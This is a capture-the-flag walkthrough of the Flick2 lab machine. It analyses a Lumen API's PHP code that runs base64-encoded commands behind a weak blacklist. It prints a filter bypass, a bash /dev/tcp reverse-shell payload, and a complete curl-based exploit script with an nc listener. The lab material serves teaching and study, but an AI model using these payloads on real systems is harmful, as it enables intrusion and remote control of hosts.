### Flick2 - Remote Command Execution

Within this walkthrough, I will skip any part not related to the web application exploitation, but for sake of consistency I would briefly explain what (and why) I skip.

#### Intro

You may not agree, but I think Flick2 is a very funny machine to play with. In the "standard" method for exploitation, it involves playing with a an APK in order to have an understanding of the web API hosted on the server.
The method I'm presenting now, we'll allow us to discover the vulnerability without touching the APK, but studying directly the API implementation.

#### Vulnerability Discovery

The application is made on top of PHP Laravel/Lumen framework. The application code can be found at `/usr/share/nginx/serverchecker`. As always, let' start with catching the overall application structure, using tree, clock or similar tools. Filtering out the not-interesting parts, the app structure would be like the following:

```
/usr/share/ngnix/serverchecker
├── public
│   └── index.php
├── server.php
├── bootstrap
│   └── app.php
├── app
│   ├── Http
│   │   ├── Controllers
│   │   │   └── Controller.php
│   │   ├── Middleware
│   │   │   ├── ApiAuth.php
│   │   │   └── ExampleMiddleware.php
│   │   └── routes.php
│   ├── Key.php
│   └── [other dirs/files]
├── database
│   ├── factories
│   ├── migrations
│   └── seeds
├── storage
│   ├── app
│   ├── database.sqlite
│   ├── framework
│   └── logs
└── vendor
    └── [other dirs/files]
```

The `server.php` file, seems to be the file welcoming you when you try to access Flick2 from the outside, on port 443. So, let's start our analysis with it and see what we can find:

```php
<?php
$uri = urldecode(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH));
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}
require_once __DIR__.'/public/index.php';
```

So, we continue with `public/index.php`:

```php
<?php
$app = require __DIR__.'/../bootstrap/app.php';
$app->run();
```

And so, we arrive at the start of the real implementation in `/bootstrap/app.php`. As I said, the API is made on top of Lumen, so knowing how Lumen maps applications' "routes" (informally paths) and how it handles authentication, it may be possible to skip this part, but I do not recommend it during a thorough code analysis. Anyway, let's focus on the important bits of the file, below:

```php
<?php
// Auth
$app->routeMiddleware([
    'api_auth' => 'App\Http\Middleware\ApiAuth',
]);
// Routes to controllers mapping
$app->group(['namespace' => 'App\Http\Controllers'], function ($app) {
    require __DIR__.'/../app/Http/routes.php';
});
return $app;
```
Well, wonderful, now we know where is the authentication logic, and where to find the routes and the controllers. Let's start analysing the routes file `/app/Http/routes.php` to see if we can find something interesting:

```php
<?php
$app->group(['prefix' => 'do', 'middleware' => 'api_auth'], function () use ($app) {

    // Return the registration status of a uuid
    $app->get('/cmd/{command}', function($command) use ($app) {

        if (base64_decode($command, true) === False)
            return response()
                ->json([
                    'status' => 'error',
                    'output' => 'Bad command format.'
                ]);

        // Get the command...
        $command = base64_decode($command);

        // ... and filter it
        $bad_commands = [
            'bash',
            ...,
            'nc',
            'netcat',
            'python',
        ];

        if(0 < count(array_intersect(array_map('strtolower', explode(' ', $command)), $bad_commands))) {

            return response()
                ->json([
                    'status' => 'error',
                    'output' => 'Command \'' . $command . '\' contains a banned command.'
                ]);
        }

        $process = new Process($command);
        $process->run();

        if (!$process->isSuccessful()) {
            return response()
                ->json([
                    'status' => 'error',
                    'output' => $process->getErrorOutput()
                ]);
        }

        return response()
            ->json([
                'status' => 'ok',
                'command' => $command,
                'output' => $process->getOutput()
            ]);
    });
```

All of your alarms should be ringing now, as that's actually a way to implement command execution. So, it seems that in order to execute the command it's necessary to issue a HTTP GET REQUEST using an URL in the form `/do/cmd/$base64_encoded_command` where `/do` is the prefix given in the group definition.

Ok, that's really fantastic. But is that all? If we take a deeper look, we can see that in order to make our command execute, we should first authenticate against the API:

```php
$app->group(['prefix' => 'do', 'middleware' => 'api_auth'], function () use ($app) {...}
```

So, let's take a step back and analyse the authentication logic in `/app/Http/Middleware/ApiAuth.php`:

```php
<?php namespace App\Http\Middleware;

use Closure;
use Request;

class ApiAuth {
    public function handle($request, Closure $next)
    {

        if (!\App\Key::where(['uuid' => Request::header('X-UUID'), 'token' => Request::header('X-Token')])->first())
            return response()
                ->json(['error' => 'Invalid authentication headers.'], 401);

        return $next($request);
    }
} 
```

The application will search for the values of two HTTP headers, `X-UUID` and `X-Token` from our HTTP request and check if a couple (uuid, token) exists in the application (the object `Key`). If you rememebr the application structure, we can easily access the file `/app/Key.php` to see that the class effectively implements just an object mapping an UUID to an authentication token.

```php
<?php namespace App;
use Illuminate\Database\Eloquent\Model;

class Key extends Model
{
    protected $fillable = ['uuid', 'token'];
}
```
So let's take a step back and see how the login flow works.

*Note: The following snippet is taken from `/app/Http/routes.php`*

```php
<?php
$app->group(['prefix' => 'register'], function () use ($app) {
    $app->get('/status/{uuid}', function($uuid) use ($app) {
        $status = App\Key::where('uuid', $uuid)->first();
        if($status)
            return response()
                ->json(['registered' => 'yes']);
        return response()
            ->json(['registered' => 'no']);
    });

    $app->post('/new', function() use ($app) {
        if (!Request::has('uuid'))
            return response()
                ->json([
                    'error' => 'A UUID is required.'
                ], 400);
        $key = App\Key::firstOrNew(['uuid' => Request::input('uuid')]);
        $key->token = str_random(32);
        $key->save();
        return response()
            ->json([
                'registered' => 'ok',
                'message' => 'The requested UUID is now registered.',
                'token' => $key->token
            ]);
    });
});
```

We can register a new authenticated session creating a new Key. In order to do that, it's enough to issue an HTTP POST request to the URL path `/register/new/` with the POST parameter `uuid` set to an arbitrary uuid.

Once we have a token, we can issue the next request and get remote command execution.

#### Bypassing the filter

As we've already seen, the application attempts to validate the command using a blacklisting approach:

```php
<?php
if(0 < count(array_intersect(array_map('strtolower', explode(' ', $command)), $bad_commands))) {...}
```

The creator of the app, says that this blacklisting method is **SUPER FAIL**, and that should be the point. He gave us even a bypass PoC, below:

```bash
/do/cmd/$(echo -n "\$(echo "`echo 'uname -a' | base64`" | base64 -d)" | base64)
```

Well... I think it's actually quite overcomplex as this simpler version works fine as well:

```bash
/do/cmd/$(echo -n '/sbin/ip a' | base64)
```

It's trivial to see why it works: the command is split in tokens using a space as delimiter, then each token is checked against the blacklist. As `/sbin/ip` contains no spaces, it's a single token, and it's different from any value in the blacklist.

##### Exploit

We can then exploit flick2 using a the following reverse shell payload:

```bash
/do/cmd/$(echo -n '/bin/bash -i >& /dev/tcp/192.168.56.1/444 0>&1' | base64)
```

#### Wrapping up

The completed exploit, once finished, will look like that:

```bash
#!/bin/sh

# Varibale used, change them to fit your needs
target="flick2.local"
lport="444"
lhost="192.168.56.1"
uuid="00000-231234fds-sdffdg2-32"
proxy="-x http://127.0.0.1:8080"

printf "[*] Staring Listener on port $lport"
gnome-terminal -- nc -lvkp $lport 2>/dev/null
sleep 1
echo "DONE"

printf "[*] Loggin in..."
token=$(curl -ksi $proxy -v -H "Content-Type: application/json" -X POST -d "{\"uuid\":\"$uuid\"}" "http://$target/register/new")
echo "DONE"

printf "[*] Crafting reverse shell command"
curl -ksi $proxy -v -H "Content-Type: application/json" -H "X-UUID: $uuid" -H "X-Token: $token" -X GET "http://$target/do/cmd/$(echo -n \"/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1\" | base64)" &>/dev/null
sleep 1
echo "DONE"
```

#### Exercise

I prepared a "hardened version" (well, not so much) of the `serverchecker` API, you can find it [here](res/serverchecker.tar.gz). Upload it to flick2, change the old directory with the new one and try to bypass the authentication and the filter on your own.

**SPOILER ALERT:** The exploit script under the res directory is the solution to the exercise, so it's recommended not seeing that before completing the exercise.

You can use the following script, if you want, but flick2 should reach the internet in order to do it:

```bash
cd /usr/share/nginx/
mv serverchecker serverchecker.bck
curl -ks https://github.com/klezVirus/Posts/raw/master/reviews/vulnhub/flick2/res/serverchecker.tar.gz -o serverchecker.tar.gz
tar -xzvf serverchecker.tar.gz
mv serverchecker-hardened serverchecker
```

#### Conclusion

Good machine indeed, it may not be as complex as OSWE, but it's far above other machines of its kind. I advise to go for it, and to give a try to the "hardened" version as well, even if it's not that difficult.
